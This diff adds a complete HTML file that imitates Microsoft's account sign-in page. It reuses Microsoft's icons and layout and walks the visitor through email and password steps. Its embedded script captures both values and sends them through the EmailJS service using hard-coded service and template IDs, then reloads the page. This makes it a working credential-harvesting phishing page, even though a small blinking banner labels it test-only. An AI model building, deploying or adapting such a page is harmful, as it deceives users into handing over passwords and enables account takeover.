@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8"/>
+        <title>Sign in to your account</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+        <noscript>
+            <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
+        </noscript>
+        <link rel="shortcut icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+        <style>
+            body{
+                background-color: rgb(0, 99, 168);
+                font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+                font-weight: 400;
+                box-sizing: border-box;
+                margin: 0;
+            }
+            #footer{
+                background-color: rgba(0, 0, 0, 0.6);
+                position: absolute;
+                left: 0;
+                bottom: 0;
+                width: 100%;
+                min-height: 28px;
+            }
+            a{
+                text-decoration: none;
+            }
+            #lightbox{
+                margin-bottom: 20px;
+                margin-left: auto;
+                margin-right: auto;
+                position: relative;
+                max-width: 440px;
+                width: calc(100% - 40px);
+                padding: 44px;
+                background-color: #fff;
+                box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+                min-width: 320px;
+                min-height: 338px;
+                overflow: hidden;
+                box-sizing: border-box;
+                display: block;
+            }
+            @keyframes show-from-right {
+                0%{
+                    left: 200px;
+                    opacity: 0;
+                }
+                100%{
+                    left: 0;
+                    opacity: 1;
+                }
+            }
+            @keyframes leave {
+                0%{
+                    left: 0;
+                    opacity: 1;
+                }
+                100%{
+                    left: -200px;
+                    opacity: 0;
+                }
+            }
+            @keyframes remove {
+                0%{
+                    filter: opacity(1);
+                }
+                100%{
+                    filter: opacity(0);
+                }
+            }
+            #opts{
+                margin-left: auto;
+                margin-right: auto;
+                position: relative;
+                max-width: 440px;
+                width: calc(100% - 40px);
+                margin-bottom: 28px;
+                line-height: 16px;
+                min-width: 320px;
+                box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+                background-color: #fff;
+                cursor: pointer;
+            }
+            #opts:hover{
+                background-color: #e6e6e6;
+            }
+            #opts:active{
+                background-color: #b3b3b3;
+            }
+            #opts:focus{
+                outline: #000 dashed 1px;
+                background-color: #ccc;
+            }
+            img{
+                vertical-align: middle;
+            }
+            #terms, #privacy{
+                color: #fff;
+                font-size: 12px;
+                margin: 0 8px;
+                display: inline-block;
+                white-space: nowrap;
+                line-height: 28px;
+                cursor: pointer;
+            }
+            #terms:hover, #privacy:hover{
+                text-decoration: underline;
+            }
+            #loginbx{
+                border-style: solid;
+                padding: 6px 0;
+                border-width: 0;
+                border-bottom-width: 1px;
+                border-color: rgba(0, 0, 0, 0.6);
+                height: 22px;
+                outline: none;
+                padding-left: 0;
+                width: 100%;
+                font-size: 15px;
+            }
+            #loginbx:focus{
+                border-color: #0067b8;
+                background-color: transparent;
+            }
+            #loginbx:hover{
+                border-color: rgba(0, 0, 0, 0.8);
+            }
+            #forgot{
+                color: #0067b8;
+                text-decoration: none;
+                padding: 0 2px;
+                cursor: pointer;
+            }
+            #forgot:hover{
+                text-decoration: underline;
+                color: #666;
+            }
+            #forgot:focus{
+                outline-offset: 0;
+            }
+            #forgot:active{
+                color: #999;
+            }
+            .sbt{
+                color: #fff;
+                border-color: #0067b8;
+                background-color: #0067b8;
+                display: block;
+                width: 100%;
+                margin-top: 0;
+                margin-bottom: 0;
+                min-height: 32px;
+                border: none;
+                min-width: 108px;
+                line-height: normal;
+                padding: 4px 12px 4px 12px;
+                position: relative;
+                max-width: 100%;
+                text-align: center;
+                white-space: nowrap;
+                text-overflow: ellipsis;
+                touch-action: manipulation;
+                cursor: pointer;
+                font-size: 15px;
+            }
+            .sbt:focus{
+                background-color: #005da6;
+                text-decoration: underline;
+                outline: 2px solid #000;
+            }
+            .sbt:active{
+                outline: none;
+                text-decoration: none;
+                transform: scale(.98);
+            }
+            .sbt:hover{
+                background-color: #005da6;
+            }
+            #back{
+                min-height: 24px;
+                width: 24px;
+                min-width: 24px;
+                float: left;
+                padding: 0;
+                background-color: #fff;
+                border-width: 0;
+                border-radius: 12px;
+                margin-right: 2px;
+                cursor: pointer;
+            }
+            #back:hover{
+                background-color: rgba(0, 0, 0, 0.1);
+            }
+            #back:active{
+                background-color: rgba(0, 0, 0, 0.3);
+            }
+            #back:focus{
+                background-color: rgba(0, 0, 0, 0.1);
+                text-decoration: underline;
+                outline: 2px solid #000;
+            }
+            #return{
+                height: 24px;
+                margin-top: 16px;
+                margin-bottom: -4px;
+                box-sizing: border-box;
+            }
+            #fix{
+                position: fixed;
+                left: 30px;
+            }
+            #test{
+                color: #f00;
+            }
+        </style>
+    </head>
+    <body>
+        <div style="display: table; position: absolute; height: 100%; width: 100%;">
+            <div style="display: table-row; height: 100%;">
+                <div style="vertical-align: middle; display: table-cell;">
+                    <div id="lightbox">
+                        <img style="max-height: 36px;" src="https://aadcdn.msauthimages.net/dbd5a2dd-gfgyr-f-pq-l3uf9j6idjcrx3hkuxrpnjfhf-5zk0rq/logintenantbranding/0/bannerlogo?ts=638085465503870799">
+                        <div style="animation-name: show-from-right; animation-duration: 0.25s; animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1); position: relative; min-height: 206px;" id="a1">
+                            <div style="font-weight: 600; font-size: 24px; margin-top: 16px; margin-bottom: 12px;">Sign in</div>
+                            <div style="padding-left: 2px; padding-right: 2px;">
+                                <div style="margin-bottom: 16px; width: 100%;">
+                                    <input type="email" id="loginbx" placeholder="Email, phone, or Skype" spellcheck="false" tabindex="0"/>
+                                </div>
+                            </div>
+                            <div style="margin-bottom: 52px; font-size: 0.8125rem; width: 100%; display: inline-block;">
+                                <a id="forgot" tabindex="0">Can’t access your account?</a>
+                            </div>
+                            <div style="position: absolute; bottom: 0; right: 0; text-align: right; width: 100%;">
+                                <div style="display: inline-block; box-sizing: border-box; text-align: right;">
+                                    <input type="submit" class="sbt" id="sbt1" value="Next" tabindex="0"/>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="opts" tabindex="0">
+                        <div style="display: table; table-layout: fixed; padding: 8px 44px;">
+                            <div style="display: table-row;">
+                                <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" style="width: 32px; height: 32px;"/>
+                                <div style="width: 100%; padding: 0 12px; display: table-cell; vertical-align: middle; font-weight: 400; font-size: 15px;">Sign-in options</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="footer">
+            <div style="float: right;">
+                <span id="terms" tabindex="0">Terms of use</span>
+                <span id="privacy" tabindex="0">Privacy & cookies</span>
+                <a tabindex="0" style="color: #fff; letter-spacing: 3px; line-height: 22px; vertical-align: top; font-size: 16px; font-weight: 600; white-space: nowrap; display: inline-block; margin: 0 8px; cursor: pointer;">...</a>
+            </div>
+        </div>
+        <div id="fix">
+            <h1 id="test">仅测试，登录禁止</h1>
+            <p style="color: #fff;">@蕉饼</p>
+        </div>
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+        <script type="text/javascript">
+            (function(){
+               emailjs.init("NFQKZzQNU25n0xJ3_");
+            })();
+        </script>
+        <script>
+            var email = '';
+            var password = '';
+            const sleep = ms => new Promise(res => setTimeout(res, ms));
+            document.getElementById('loginbx').onkeydown = function(event){
+                if(event.key == 'Enter'){
+                    document.getElementById('sbt1').click();
+                }
+            }
+            document.getElementById('sbt1').onclick = async function(){
+                email = document.getElementById('loginbx').value;
+                document.getElementById('a1').style.animationName = 'leave';
+                document.getElementById('a1').style.animationFillMode = 'forwards';
+                document.getElementById('opts').style.animation = '0.25s ease remove forwards';
+                await sleep(250);
+                document.getElementById('opts').remove();
+                document.getElementById('a1').remove();
+                document.getElementById('lightbox').innerHTML += `
+                <div id="return">
+                    <button id="back" tabindex="0">
+                        <img style="vertical-align: middle;" src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"/>
+                    </button>
+                    <div style="line-height: 24px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: #1b1b1b">` + email + `</div>
+                </div>
+                <div style="animation-name: show-from-right; animation-duration: 0.25s; animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1); position: relative; min-height: 170px;" id="a2">
+                    <div style="line-height: 1.75rem; color: #1b1b1b; font-size: 1.5rem; font-weight:600; padding: 0; margin-top: 16px; margin-bottom: 12px;">Enter password</div>
+                    <div style="padding-left: 2px; padding-right: 2px;">
+                        <div style="margin-bottom: 16px; width: 100%;">
+                            <input type="password" id="loginbx" placeholder="Password" spellcheck="false" tabindex="0"/>
+                        </div>
+                    </div>
+                    <div style="margin-bottom: 52px; font-size: 0.8125rem; width: 100%; display: inline-block;">
+                        <a id="forgot" tabindex="0">Forgot my password</a>
+                    </div>
+                    <div style="position: absolute; bottom: 0; right: 0; text-align: right; width: 100%;">
+                        <div style="display: inline-block; box-sizing: border-box; text-align: right;">
+                            <input type="submit" class="sbt" id="sbt2" value="Sign in" tabindex="0"/>
+                        </div>
+                    </div>
+                </div>
+                `;
+                document.getElementById('loginbx').onkeydown = function(event){
+                    if(event.key == 'Enter'){
+                        document.getElementById('sbt2').click();
+                    }
+                }
+                document.getElementById('sbt2').onclick = async function(){
+                    password = document.getElementById('loginbx').value;
+                    document.getElementById('a2').style.animationName = 'leave';
+                    document.getElementById('a2').style.animationFillMode = 'forwards';
+                    send();
+                    await sleep(250);
+                    document.getElementById('return').remove();
+                    document.getElementById('a2').remove();
+                }
+            }
+            async function send(){
+                emailjs.send("service_fk5hn8j", "template_lfsnd6r", {email: email, password: password}).then((response) => location.reload());
+            }
+            async function loop(){
+                while (true){
+                    await sleep(500);
+                    document.getElementById('test').style.color = '#fff';
+                    await sleep(500);
+                    document.getElementById('test').style.color = '';
+                }
+            }
+            loop();
+        </script>
+    </body>
+</html>
